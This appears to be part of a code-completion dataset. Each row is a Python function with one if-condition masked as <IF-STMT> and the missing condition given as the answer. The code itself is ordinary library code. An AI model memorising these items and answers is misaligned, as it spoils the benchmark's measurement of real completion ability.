1937,"def span_tokenize(self, string):<tab>if self.__tokenizer == ""nltk"":<tab><tab>raw_tokens = nltk.word_tokenize(string)<tab><tab><IF-STMT><tab><tab><tab>matched = [m.group() for m in re.finditer(r""``|'{2}|\"""", string)]<tab><tab><tab>tokens = [<tab><tab><tab><tab>matched.pop(0) if tok in ['""', ""``"", ""''""] else tok<tab><tab><tab><tab>for tok in raw_tokens<tab><tab><tab>]<tab><tab>else:<tab><tab><tab>tokens = raw_tokens<tab><tab>spans = align_tokens(tokens, string)<tab>return spans","if ( '""' in string ) or ( ""''"" in string ) :",155
1938,"def literal(self):<tab>if self.peek('""'):<tab><tab>lit, lang, dtype = self.eat(r_literal).groups()<tab><tab>if lang:<tab><tab><tab>lang = lang<tab><tab>else:<tab><tab><tab>lang = None<tab><tab>if dtype:<tab><tab><tab>dtype = dtype<tab><tab>else:<tab><tab><tab>dtype = None<tab><tab><IF-STMT><tab><tab><tab>raise ParseError(""Can't have both a language and a datatype"")<tab><tab>lit = unquote(lit)<tab><tab>return Literal(lit, lang, dtype)<tab>return False",if lang and dtype :,132
1939,"def get():<tab>result = []<tab>for b in self.key_bindings:<tab><tab>if len(keys) < len(b.keys):<tab><tab><tab>match = True<tab><tab><tab>for i, j in zip(b.keys, keys):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>match = False<tab><tab><tab><tab><tab>break<tab><tab><tab>if match:<tab><tab><tab><tab>result.append(b)<tab>return result",if i != j and i != Keys . Any :,113
1940,"def _compileRules(rulesList, maxLength=4):<tab>ruleChecking = collections.defaultdict(list)<tab>for ruleIndex in range(len(rulesList)):<tab><tab>args = []<tab><tab>if len(rulesList[ruleIndex]) == maxLength:<tab><tab><tab>args = rulesList[ruleIndex][-1]<tab><tab><IF-STMT><tab><tab><tab>(shouldRunMethod, method, isCorrect) = rulesList[ruleIndex][0:3]<tab><tab><tab>ruleChecking[shouldRunMethod].append((method, isCorrect, args))<tab><tab>elif maxLength == 3:<tab><tab><tab>(shouldRunMethod, method) = rulesList[ruleIndex][0:2]<tab><tab><tab>ruleChecking[shouldRunMethod].append((method, args))<tab>return ruleChecking",if maxLength == 4 :,183
1941,def parents_in_pipfile(self):<tab>if not self._parents_in_pipfile:<tab><tab>self._parents_in_pipfile = [<tab><tab><tab>p<tab><tab><tab>for p in self.flattened_parents<tab><tab><tab><IF-STMT><tab><tab>]<tab>return self._parents_in_pipfile,if p . normalized_name in self . pipfile_packages,86
1942,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>self.set_content(d.getPrefixedString())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.set_blob_key(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 24:<tab><tab><tab>self.set_width(d.getVarInt32())<tab><tab><tab>continue<tab><tab>if tt == 32:<tab><tab><tab>self.set_height(d.getVarInt32())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 18 :,182
1943,"def base64_encode_image_mapper(self, tag, url):<tab>if tag == ""img"":<tab><tab><IF-STMT><tab><tab><tab>image_data = base64.b64encode(self.kp_images[url])<tab><tab><tab>image_mimetype = mimetypes.guess_type(url)[0]<tab><tab><tab>if image_mimetype is not None:<tab><tab><tab><tab>return ""data:{};base64, "".format(image_mimetype) + image_data.decode(<tab><tab><tab><tab><tab>""utf-8""<tab><tab><tab><tab>)<tab>return None",if url in self . kp_images :,138
1944,"def get_args_from_ref_args(handler, ref_args):<tab>args = []<tab>for ref_arg in ref_args:<tab><tab><IF-STMT><tab><tab><tab>temp = handler.create_from_numpy(ref_arg)<tab><tab><tab>args.append(temp)<tab><tab>else:<tab><tab><tab>args.append(ref_arg)<tab>return args",if type ( ref_arg ) is ref . array_type :,100
1945,"def _get_cols_width(self, values):<tab>width = 14<tab>for row in values:<tab><tab>for header in self.headers:<tab><tab><tab>header_len = len(header)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>width = header_len<tab><tab><tab>value_len = len(unicode(row.get(header, """")))<tab><tab><tab>if value_len > width:<tab><tab><tab><tab>width = value_len<tab>width += 2<tab>return width",if header_len > width :,118
1946,"def OnLeaveWindow(self, event):<tab>if self.start_drag and not self.dragging:<tab><tab>self.dragging = False<tab><tab>self.start_drag = False<tab><tab>self.dragged_tab = None<tab><tab>self.drag_trigger = self.drag_trail<tab><tab><IF-STMT><tab><tab><tab>self.ReleaseMouse()<tab>if self.preview_wnd:<tab><tab>self.preview_wnd.Show(False)<tab><tab>del self.preview_wnd<tab><tab>self.preview_wnd = None<tab>event.Skip()",if self . HasCapture ( ) :,138
1947,"def _checkPid(self, pid):<tab>retval = False<tab>if self.settings.windows:<tab><tab>PROCESS_TERMINATE = 1<tab><tab>p = ctypes.windll.kernel32.OpenProcess(PROCESS_TERMINATE, 0, pid)<tab><tab>retval = p != 0<tab><tab><IF-STMT><tab><tab><tab>ctypes.windll.kernel32.CloseHandle(p)<tab>else:<tab><tab># https://stackoverflow.com/questions/568271/how-to-check-if-there-exists-a-process-with-a-given-pid-in-python<tab><tab>try:<tab><tab><tab>os.kill(pid, 0)<tab><tab>except OSError:<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>retval = True<tab>return retval",if p :,177
1948,"def concat_index_value(index_values, store_data=False):<tab>result = pd.Index([])<tab>if not isinstance(index_values, (list, tuple)):<tab><tab>index_values = [index_values]<tab>for index_value in index_values:<tab><tab><IF-STMT><tab><tab><tab>result = result.append(index_value)<tab><tab>else:<tab><tab><tab>result = result.append(index_value.to_pandas())<tab>return parse_index(result, store_data=store_data)","if isinstance ( index_value , pd . Index ) :",132
1949,"def apply(self, db, family):<tab>if self.rtype:<tab><tab>if self.rtype.is_custom() and self.use_regex:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab>elif self.rtype != family.get_relationship():<tab><tab><tab>return False<tab>return True",if self . regex [ 0 ] . search ( str ( family . get_relationship ( ) ) ) is None :,93
1950,"def get_child_nodes(node):<tab>if isinstance(node, _ast.Module):<tab><tab>return node.body<tab>result = []<tab>if node._fields is not None:<tab><tab>for name in node._fields:<tab><tab><tab>child = getattr(node, name)<tab><tab><tab>if isinstance(child, list):<tab><tab><tab><tab>for entry in child:<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>result.append(entry)<tab><tab><tab>if isinstance(child, _ast.AST):<tab><tab><tab><tab>result.append(child)<tab>return result","if isinstance ( entry , _ast . AST ) :",145
1951,"def output(self):<tab>""""""Transform self into a list of (name, value) tuples.""""""<tab>header_list = []<tab>for k, v in self.items():<tab><tab>if isinstance(k, unicodestr):<tab><tab><tab>k = self.encode(k)<tab><tab>if not isinstance(v, basestring):<tab><tab><tab>v = str(v)<tab><tab><IF-STMT><tab><tab><tab>v = self.encode(v)<tab><tab># See header_translate_* constants above.<tab><tab># Replace only if you really know what you're doing.<tab><tab>k = k.translate(header_translate_table, header_translate_deletechars)<tab><tab>v = v.translate(header_translate_table, header_translate_deletechars)<tab><tab>header_list.append((k, v))<tab>return header_list","if isinstance ( v , unicodestr ) :",197
1952,"def check_valid_emoji_name(emoji_name: str) -> None:<tab>if emoji_name:<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>raise JsonableError(_(""Invalid characters in emoji name""))<tab>raise JsonableError(_(""Emoji name is missing""))","if re . match ( r""^[0-9a-z.\-_]+(?<![.\-_])$"" , emoji_name ) :",93
1953,"def cache_subscriptions(self, region: str):<tab>async with self.regional_subscriptions_cache_locks.setdefault(<tab><tab>region, asyncio.Lock()<tab>):<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>self.subscriptions_cache[region] = await AWSFacadeUtils.get_all_pages(<tab><tab><tab>""sns"", region, self.session, ""list_subscriptions"", ""Subscriptions""<tab><tab>)<tab><tab>for subscription in self.subscriptions_cache[region]:<tab><tab><tab>topic_arn = subscription.pop(""TopicArn"")<tab><tab><tab>subscription[""topic_name""] = topic_arn.split("":"")[-1]",if region in self . subscriptions_cache :,160
1954,"def AdjustArg(arg, break_chars, argv_out):<tab># type: (str, List[str], List[str]) -> None<tab>end_indices = []  # stores the end of each span<tab>state = ST_Begin<tab>for i, c in enumerate(arg):<tab><tab>ch = CH_Break if c in break_chars else CH_Other<tab><tab>state, emit_span = _TRANSITIONS[state, ch]<tab><tab><IF-STMT><tab><tab><tab>end_indices.append(i)<tab># Always emit a span at the end (even for empty string)<tab>end_indices.append(len(arg))<tab>begin = 0<tab>for end in end_indices:<tab><tab>argv_out.append(arg[begin:end])<tab><tab>begin = end",if emit_span :,185
1955,"def load_model(<tab>self, model_name: str, path: str = None, model_type=None) -> AbstractModel:<tab>if isinstance(model_name, AbstractModel):<tab><tab>return model_name<tab>if model_name in self.models.keys():<tab><tab>return self.models[model_name]<tab>else:<tab><tab>if path is None:<tab><tab><tab>path = self.get_model_attribute(model=model_name, attribute=""path"")<tab><tab><IF-STMT><tab><tab><tab>model_type = self.get_model_attribute(model=model_name, attribute=""type"")<tab><tab>return model_type.load(path=path, reset_paths=self.reset_paths)",if model_type is None :,170
1956,"def find_config(pipeline_config_path: Union[str, Path]) -> Path:<tab>if not Path(pipeline_config_path).is_file():<tab><tab>configs = [<tab><tab><tab>c<tab><tab><tab>for c in Path(__file__).parent.parent.parent.glob(<tab><tab><tab><tab>f""configs/**/{pipeline_config_path}.json""<tab><tab><tab>)<tab><tab><tab><IF-STMT><tab><tab>]  # a simple way to not allow * and ?<tab><tab>if configs:<tab><tab><tab>log.info(f""Interpreting '{pipeline_config_path}' as '{configs[0]}'"")<tab><tab><tab>pipeline_config_path = configs[0]<tab>return Path(pipeline_config_path)","if str ( c . with_suffix ( """" ) ) . endswith ( pipeline_config_path )",184
1957,"def __init__(self, bounds, channel_axis, preprocess=None):<tab>assert len(bounds) == 2<tab>assert channel_axis in [0, 1, 2, 3]<tab>self._bounds = bounds<tab>self._channel_axis = channel_axis<tab># Make self._preprocess to be (0,1) if possible, so that don't need<tab># to do substract or divide.<tab>if preprocess is not None:<tab><tab>sub, div = np.array(preprocess)<tab><tab>if not np.any(sub):<tab><tab><tab>sub = 0<tab><tab><IF-STMT><tab><tab><tab>div = 1<tab><tab>assert (div is None) or np.all(div)<tab><tab>self._preprocess = (sub, div)<tab>else:<tab><tab>self._preprocess = (0, 1)",if np . all ( div == 1 ) :,194
1958,"def iter_imports(path):<tab>""""""Yield imports in *path*""""""<tab>for node in ast.parse(open(path, ""rb"").read()).body:<tab><tab>if isinstance(node, ast.ImportFrom):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>prefix = ()<tab><tab><tab>else:<tab><tab><tab><tab>prefix = tuple(node.module.split("".""))<tab><tab><tab>for snode in node.names:<tab><tab><tab><tab>yield (node.level, prefix + (snode.name,))<tab><tab>elif isinstance(node, ast.Import):<tab><tab><tab>for node in node.names:<tab><tab><tab><tab>yield (0, tuple(node.name.split(""."")))",if node . module is None :,162
1959,"def __init__(self, spec=None, add_book=True, xl=None, visible=None):<tab># visible is only required on mac<tab>if spec is not None:<tab><tab>warn(""spec is ignored on Windows."")<tab>if xl is None:<tab><tab># new instance<tab><tab>self._xl = COMRetryObjectWrapper(DispatchEx(""Excel.Application""))<tab><tab><IF-STMT><tab><tab><tab>self._xl.Workbooks.Add()<tab><tab>self._hwnd = None<tab>elif isinstance(xl, int):<tab><tab>self._xl = None<tab><tab>self._hwnd = xl<tab>else:<tab><tab>self._xl = xl<tab><tab>self._hwnd = None",if add_book :,166
1960,"def _find_split():<tab>""""""Find the first = sign to split on (that isn't in [brackets])""""""<tab>key = []<tab>value = []<tab>brackets = False<tab>chars = list(expression)<tab>while chars:<tab><tab>c = chars.pop(0)<tab><tab>if c == ""="" and not brackets:<tab><tab><tab># keys done the rest is value<tab><tab><tab>value = chars<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>brackets = True<tab><tab><tab>key += c<tab><tab>elif c == ""]"" and brackets:<tab><tab><tab>brackets = False<tab><tab><tab>key += c<tab><tab>else:<tab><tab><tab># normal character<tab><tab><tab>key += c<tab>return """".join(key), """".join(value)","elif c == ""["" :",177
1961,"def _ApplySizeLimit(<tab>regions: Iterable[rdf_memory.ProcessMemoryRegion], size_limit: int) -> List[rdf_memory.ProcessMemoryRegion]:<tab>""""""Truncates regions so that the total size stays in size_limit.""""""<tab>total_size = 0<tab>regions_in_limit = []<tab>for region in regions:<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>region.dumped_size = min(region.size, size_limit - total_size)<tab><tab>regions_in_limit.append(region)<tab><tab>total_size += region.dumped_size<tab>return regions_in_limit",if total_size >= size_limit :,151
1962,"def _get_matched_files(input_path):<tab>""""""Returns all files that matches the input_path.""""""<tab>input_patterns = input_path.strip().split("","")<tab>all_matched_files = []<tab>for input_pattern in input_patterns:<tab><tab>input_pattern = input_pattern.strip()<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>matched_files = tf.io.gfile.glob(input_pattern)<tab><tab>if not matched_files:<tab><tab><tab>raise ValueError(""%s does not match any files."" % input_pattern)<tab><tab>else:<tab><tab><tab>all_matched_files.extend(matched_files)<tab>return sorted(all_matched_files)",if not input_pattern :,166
1963,"def _add_kid(key, x):<tab>if x is None:<tab><tab>kids[key] = None<tab>else:<tab><tab>if type(x) in (type([]), type(())):<tab><tab><tab>x1 = [i for i in x if isinstance(i, TVTKBase)]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>kids[key] = x1<tab><tab>elif isinstance(x, TVTKBase):<tab><tab><tab>if hasattr(x, ""__iter__""):<tab><tab><tab><tab># Don't add iterable objects that contain non<tab><tab><tab><tab># acceptable nodes<tab><tab><tab><tab>if len(list(x)) and isinstance(list(x)[0], TVTKBase):<tab><tab><tab><tab><tab>kids[key] = x<tab><tab><tab>else:<tab><tab><tab><tab>kids[key] = x",if x1 :,196
1964,"def _read_info(self, field):<tab>fs.File._read_info(self, field)<tab>if field == ""dimensions"":<tab><tab>self.dimensions = self._plat_get_dimensions()<tab><tab><IF-STMT><tab><tab><tab>self.dimensions = (self.dimensions[1], self.dimensions[0])<tab>elif field == ""exif_timestamp"":<tab><tab>self.exif_timestamp = self._get_exif_timestamp()","if self . _get_orientation ( ) in { 5 , 6 , 7 , 8 } :",116
1965,"def process_timeline(self, info):<tab>children = info.get(""_children"", [])<tab>if not children:<tab><tab>return False<tab>for entry in children:<tab><tab>state = TIMELINE_STATES.get(entry.get(""state""))<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>self.emit(""%s.timeline.%s"" % (self.name, state), entry)<tab>return True",if not state :,98
1966,"def from_chx(self):<tab>if self.array is not None:<tab><tab>device = backend.get_device_from_array(self.array)<tab>else:<tab><tab>device = self._initial_device<tab>if device.xp is chainerx:<tab><tab>backend_name = device.device.backend.name<tab><tab>if backend_name == ""native"":<tab><tab><tab>self._initial_device = backend.CpuDevice()<tab><tab><IF-STMT><tab><tab><tab>self._initial_device = backend.GpuDevice.from_device_id(device.device.index)<tab>super(Parameter, self)._from_chx(allow_unchaining=True)","elif backend_name == ""cuda"" :",162
1967,"def get_title_extensions(self, title=None):<tab>extensions = []<tab>for extension in self.title_extensions:<tab><tab><IF-STMT><tab><tab><tab>extensions.extend(list(extension.objects.filter(extended_object=title)))<tab><tab>else:<tab><tab><tab>extensions.extend(list(extension.objects.all()))<tab>return extensions",if title :,83
1968,"def tag(vs, push=False):<tab>""""""Make the tagged release commit""""""<tab>patch_version(vs, repo_root)<tab>with cd(repo_root):<tab><tab>run('git commit -a -m ""release {}""'.format(vs))<tab><tab>run('git tag -a -m ""release {0}"" {0}'.format(vs))<tab><tab><IF-STMT><tab><tab><tab>run(""git push"")<tab><tab><tab>run(""git push --tags"")",if push :,108
1969,"def parse_bismark_report(self, report, regexes):<tab>""""""Search a bismark report with a set of regexes""""""<tab>parsed_data = {}<tab>for k, r in regexes.items():<tab><tab>r_search = re.search(r, report, re.MULTILINE)<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>parsed_data[k] = float(r_search.group(1))<tab><tab><tab>except ValueError:<tab><tab><tab><tab>parsed_data[k] = r_search.group(1)  # NaN<tab>if len(parsed_data) == 0:<tab><tab>return None<tab>return parsed_data",if r_search :,156
1970,"def _scroll_delete(dirname, max_num_checkpoints=3):<tab>dirs = os.listdir(dirname)<tab>serial_map = {}<tab>for serial in dirs:<tab><tab>serial_num = _get_dir_serial(serial)<tab><tab>serial_map[serial_num] = serial<tab>if len(list(serial_map.keys())) <= max_num_checkpoints:<tab><tab>return<tab>serials = list(serial_map.keys())<tab>serials.sort(reverse=True)<tab>serials = serials[max_num_checkpoints:]<tab>for serial in serials:<tab><tab>cur_dir = _get_serial_dir(dirname, serial)<tab><tab>try:<tab><tab><tab>shutil.rmtree(cur_dir)<tab><tab>except OSError as err:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise err",if err . errno != errno . ENOENT :,198
1971,"def _lookup(self, key, dicts=None, filters=()):<tab>if dicts is None:<tab><tab>dicts = self.dicts<tab>key_len = len(key)<tab>if key_len > self.longest_key:<tab><tab>return None<tab>for d in dicts:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if key_len > d.longest_key:<tab><tab><tab>continue<tab><tab>value = d.get(key)<tab><tab>if value:<tab><tab><tab>for f in filters:<tab><tab><tab><tab>if f(key, value):<tab><tab><tab><tab><tab>return None<tab><tab><tab>return value",if not d . enabled :,150
1972,"def get_preset(self, unit):<tab>for line in self._lines:<tab><tab>m = re.match(r""(enable|disable)\s+(\S+)"", line)<tab><tab><IF-STMT><tab><tab><tab>status, pattern = m.group(1), m.group(2)<tab><tab><tab>if fnmatch.fnmatchcase(unit, pattern):<tab><tab><tab><tab>logg.debug(""%s %s => %s [%s]"", status, pattern, unit, self.filename())<tab><tab><tab><tab>return status<tab>return None",if m :,121
1973,"def gen_cpu_name(cpu):<tab>if cpu == ""simple"":<tab><tab>return event_download.get_cpustr()<tab>for j in known_cpus:<tab><tab><IF-STMT><tab><tab><tab>if isinstance(j[1][0], tuple):<tab><tab><tab><tab>return ""GenuineIntel-6-%02X-%d"" % j[1][0]<tab><tab><tab>else:<tab><tab><tab><tab>return ""GenuineIntel-6-%02X"" % j[1][0]<tab>assert False",if cpu == j [ 0 ] :,127
1974,"def allow_request(self, request, view):<tab>if settings.API_THROTTLING:<tab><tab>request_allowed = super(GranularUserRateThrottle, self).allow_request(<tab><tab><tab>request, view<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>user = getattr(request, ""user"", None)<tab><tab><tab>if user and request.user.is_authenticated:<tab><tab><tab><tab>log.info(""User %s throttled for scope %s"", request.user, self.scope)<tab><tab><tab><tab>ActivityLog.create(amo.LOG.THROTTLED, self.scope, user=user)<tab><tab>return request_allowed<tab>else:<tab><tab>return True",if not request_allowed :,164
1975,"def __getitem__(self, tagSet):<tab>try:<tab><tab>return self.__presentTypes[tagSet]<tab>except KeyError:<tab><tab><IF-STMT><tab><tab><tab>raise KeyError()<tab><tab>elif tagSet in self.__skipTypes:<tab><tab><tab>raise error.PyAsn1Error(""Key in negative map"")<tab><tab>else:<tab><tab><tab>return self.__defaultType",if self . __defaultType is None :,93
1976,"def _media(self):<tab># Get the media property of the superclass, if it exists<tab>sup_cls = super(cls, self)<tab>try:<tab><tab>base = sup_cls.media<tab>except AttributeError:<tab><tab>base = Media()<tab># Get the media definition for this class<tab>definition = getattr(cls, ""Media"", None)<tab>if definition:<tab><tab>extend = getattr(definition, ""extend"", True)<tab><tab>if extend:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>m = base<tab><tab><tab>else:<tab><tab><tab><tab>m = Media()<tab><tab><tab><tab>for medium in extend:<tab><tab><tab><tab><tab>m = m + base[medium]<tab><tab><tab>return m + Media(definition)<tab><tab>else:<tab><tab><tab>return Media(definition)<tab>else:<tab><tab>return base",if extend == True :,197
1977,"def ascii85decode(data):<tab>n = b = 0<tab>out = """"<tab>for c in data:<tab><tab>if ""!"" <= c and c <= ""u"":<tab><tab><tab>n += 1<tab><tab><tab>b = b * 85 + (ord(c) - 33)<tab><tab><tab>if n == 5:<tab><tab><tab><tab>out += struct.pack("">L"", b)<tab><tab><tab><tab>n = b = 0<tab><tab>elif c == ""z"":<tab><tab><tab>assert n == 0<tab><tab><tab>out += ""\0\0\0\0""<tab><tab><IF-STMT><tab><tab><tab>if n:<tab><tab><tab><tab>for _ in range(5 - n):<tab><tab><tab><tab><tab>b = b * 85 + 84<tab><tab><tab><tab>out += struct.pack("">L"", b)[: n - 1]<tab><tab><tab>break<tab>return out","elif c == ""~"" :",200
1978,"def get_max_shape(data):<tab>if isinstance(data, dict):<tab><tab>max = 0<tab><tab>val = None<tab><tab>for k, v in data.items():<tab><tab><tab>tmp = reduce(lambda x, y: x * y, v.shape)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>val = v.shape<tab><tab><tab><tab>max = tmp<tab><tab>return val<tab>else:<tab><tab>return data[0].shape",if tmp > max :,109
1979,"def _subscribe_core(<tab>self, observer: typing.Observer, scheduler: Optional[typing.Scheduler] = None) -> typing.Disposable:<tab>with self.lock:<tab><tab>self.check_disposed()<tab><tab><IF-STMT><tab><tab><tab>self.observers.append(observer)<tab><tab><tab>return InnerSubscription(self, observer)<tab><tab>ex = self.exception<tab><tab>has_value = self.has_value<tab><tab>value = self.value<tab>if ex:<tab><tab>observer.on_error(ex)<tab>elif has_value:<tab><tab>observer.on_next(value)<tab><tab>observer.on_completed()<tab>else:<tab><tab>observer.on_completed()<tab>return Disposable()",if not self . is_stopped :,182
1980,"def ratio(self, outevent, inevent):<tab>assert outevent not in self<tab>assert inevent in self<tab>for function in compat_itervalues(self.functions):<tab><tab>assert outevent not in function<tab><tab>assert inevent in function<tab><tab>function[outevent] = ratio(function[inevent], self[inevent])<tab><tab>for call in compat_itervalues(function.calls):<tab><tab><tab>assert outevent not in call<tab><tab><tab><IF-STMT><tab><tab><tab><tab>call[outevent] = ratio(call[inevent], self[inevent])<tab>self[outevent] = 1.0",if inevent in call :,131
1981,"def _format_changelog(self, changelog):<tab>""""""Format the changelog correctly and convert it to a list of strings""""""<tab>if not changelog:<tab><tab>return changelog<tab>new_changelog = []<tab>for line in changelog.strip().split(""\n""):<tab><tab>line = line.strip()<tab><tab>if line[0] == ""*"":<tab><tab><tab>new_changelog.extend(["""", line])<tab><tab><IF-STMT><tab><tab><tab>new_changelog.append(line)<tab><tab>else:<tab><tab><tab>new_changelog.append(""  "" + line)<tab># strip trailing newline inserted by first changelog entry<tab>if not new_changelog[0]:<tab><tab>del new_changelog[0]<tab>return new_changelog","elif line [ 0 ] == ""-"" :",168
1982,"def _set_base64md5(self, value):<tab>if value:<tab><tab><IF-STMT><tab><tab><tab>value = value.decode(""utf-8"")<tab><tab>self.local_hashes[""md5""] = binascii.a2b_base64(value)<tab>elif ""md5"" in self.local_hashes:<tab><tab>del self.local_hashes[""md5""]","if not isinstance ( value , six . string_types ) :",99
1983,"def setGeometry(self, rect):<tab>""""""Set the window geometry, but only once when using the qttabs gui.""""""<tab>if g.app.qt_use_tabs:<tab><tab>m = self.leo_master<tab><tab>assert self.leo_master<tab><tab># Only set the geometry once, even for new files.<tab><tab><IF-STMT><tab><tab><tab>m.leo_geom_inited = True<tab><tab><tab>self.leo_master.setGeometry(rect)<tab><tab><tab>QtWidgets.QMainWindow.setGeometry(self, rect)<tab>else:<tab><tab>QtWidgets.QMainWindow.setGeometry(self, rect)","if not hasattr ( m , ""leo_geom_inited"" ) :",166
1984,"def _get_extension_suppressions(mod_loaders):<tab>res = []<tab>for m in mod_loaders:<tab><tab>suppressions = getattr(m, ""suppress_extension"", None)<tab><tab>if suppressions:<tab><tab><tab>suppressions = (<tab><tab><tab><tab>suppressions if isinstance(suppressions, list) else [suppressions]<tab><tab><tab>)<tab><tab><tab>for sup in suppressions:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>res.append(sup)<tab>return res","if isinstance ( sup , ModExtensionSuppress ) :",134
1985,"def _check_positional(results):<tab>positional = None<tab>for name, char in results:<tab><tab>if positional is None:<tab><tab><tab>positional = name is None<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise TranslationError(<tab><tab><tab><tab><tab>""format string mixes positional "" ""and named placeholders""<tab><tab><tab><tab>)<tab>return bool(positional)",if ( name is None ) != positional :,98
1986,"def ascii85decode(data):<tab>n = b = 0<tab>out = """"<tab>for c in data:<tab><tab>if ""!"" <= c and c <= ""u"":<tab><tab><tab>n += 1<tab><tab><tab>b = b * 85 + (ord(c) - 33)<tab><tab><tab>if n == 5:<tab><tab><tab><tab>out += struct.pack("">L"", b)<tab><tab><tab><tab>n = b = 0<tab><tab><IF-STMT><tab><tab><tab>assert n == 0<tab><tab><tab>out += ""\0\0\0\0""<tab><tab>elif c == ""~"":<tab><tab><tab>if n:<tab><tab><tab><tab>for _ in range(5 - n):<tab><tab><tab><tab><tab>b = b * 85 + 84<tab><tab><tab><tab>out += struct.pack("">L"", b)[: n - 1]<tab><tab><tab>break<tab>return out","elif c == ""z"" :",200
1987,"def __getattr__(self, name):<tab># if the aval property raises an AttributeError, gets caught here<tab>assert skip_checks or name != ""aval""<tab>try:<tab><tab>attr = getattr(self.aval, name)<tab>except KeyError as err:<tab><tab>raise AttributeError(<tab><tab><tab>""{} has no attribute {}"".format(self.__class__.__name__, name)<tab><tab>) from err<tab>else:<tab><tab>t = type(attr)<tab><tab><IF-STMT><tab><tab><tab>return attr.fget(self)<tab><tab>elif t is aval_method:<tab><tab><tab>return types.MethodType(attr.fun, self)<tab><tab>else:<tab><tab><tab>return attr",if t is aval_property :,165
1988,"def build_vocab(self, filename):<tab>EOS = ""</eos>""<tab>vocab_dict = {}<tab>ids = 0<tab>vocab_dict[EOS] = ids<tab>ids += 1<tab>with open(filename, ""r"") as f:<tab><tab>for line in f.readlines():<tab><tab><tab>for w in line.strip().split():<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>vocab_dict[w] = ids<tab><tab><tab><tab><tab>ids += 1<tab>self.vocab_size = ids<tab>return vocab_dict",if w not in vocab_dict :,131
1989,"def eval_dummy_genomes_iznn(genomes, config):<tab>for genome_id, genome in genomes:<tab><tab>net = neat.iznn.IZNN.create(genome, config)<tab><tab>if genome_id < 10:<tab><tab><tab>net.reset()<tab><tab><tab>genome.fitness = 0.0<tab><tab><IF-STMT><tab><tab><tab>genome.fitness = 0.5<tab><tab>else:<tab><tab><tab>genome.fitness = 1.0",elif genome_id <= 150 :,129
1990,"def _add_csrf(self, without_csrf, explicit_csrf=None):<tab>parts = urlparse(without_csrf)<tab>query = parse_qs(parts[4])<tab>with self.app.session_transaction() as sess:<tab><tab><IF-STMT><tab><tab><tab>query[CSRF_TOKEN_KEY] = explicit_csrf<tab><tab>else:<tab><tab><tab>sess[CSRF_TOKEN_KEY] = ""something""<tab><tab><tab>query[CSRF_TOKEN_KEY] = sess[CSRF_TOKEN_KEY]<tab>return urlunparse(list(parts[0:4]) + [urlencode(query)] + list(parts[5:]))",if explicit_csrf is not None :,154
1991,"def test_confirm_extension_is_yml(self):<tab>files_with_incorrect_extensions = []<tab>for file in self.yield_next_rule_file_path(self.path_to_rules):<tab><tab>file_name_and_extension = os.path.splitext(file)<tab><tab><IF-STMT><tab><tab><tab>extension = file_name_and_extension[1]<tab><tab><tab>if extension != "".yml"":<tab><tab><tab><tab>files_with_incorrect_extensions.append(file)<tab>self.assertEqual(<tab><tab>files_with_incorrect_extensions,<tab><tab>[],<tab><tab>Fore.RED + ""There are rule files with extensions other than .yml"",<tab>)",if len ( file_name_and_extension ) == 2 :,172
1992,"def _handle_eof(self, m):<tab>self.lock.acquire()<tab>try:<tab><tab>if not self.eof_received:<tab><tab><tab>self.eof_received = True<tab><tab><tab>self.in_buffer.close()<tab><tab><tab>self.in_stderr_buffer.close()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._pipe.set_forever()<tab>finally:<tab><tab>self.lock.release()<tab>self._log(DEBUG, ""EOF received ({})"".format(self._name))",if self . _pipe is not None :,127
1993,"def do_close(self):<tab>if self.flags is not None and (self.flags == ""c"" or self.flags == ""w""):<tab><tab><IF-STMT><tab><tab><tab>insert = self.table.insert()<tab><tab><tab>self.bind.execute(<tab><tab><tab><tab>insert,<tab><tab><tab><tab>namespace=self.namespace,<tab><tab><tab><tab>data=self.hash,<tab><tab><tab><tab>accessed=datetime.now(),<tab><tab><tab><tab>created=datetime.now(),<tab><tab><tab>)<tab><tab><tab>self._is_new = False<tab><tab>else:<tab><tab><tab>update = self.table.update(self.table.c.namespace == self.namespace)<tab><tab><tab>self.bind.execute(update, data=self.hash, accessed=datetime.now())<tab>self.flags = None",if self . _is_new :,194
1994,"def __init__(self, sh_cmd, title=None, env=None, d=None):<tab>self.command = d and d.getVar(""OE_TERMINAL_CUSTOMCMD"")<tab>if self.command:<tab><tab><IF-STMT><tab><tab><tab>self.command += "" {command}""<tab><tab>Terminal.__init__(self, sh_cmd, title, env, d)<tab><tab>logger.warn(""Custom terminal was started."")<tab>else:<tab><tab>logger.debug(1, ""No custom terminal (OE_TERMINAL_CUSTOMCMD) set"")<tab><tab>raise UnsupportedTerminal(""OE_TERMINAL_CUSTOMCMD not set"")","if not ""{command}"" in self . command :",152
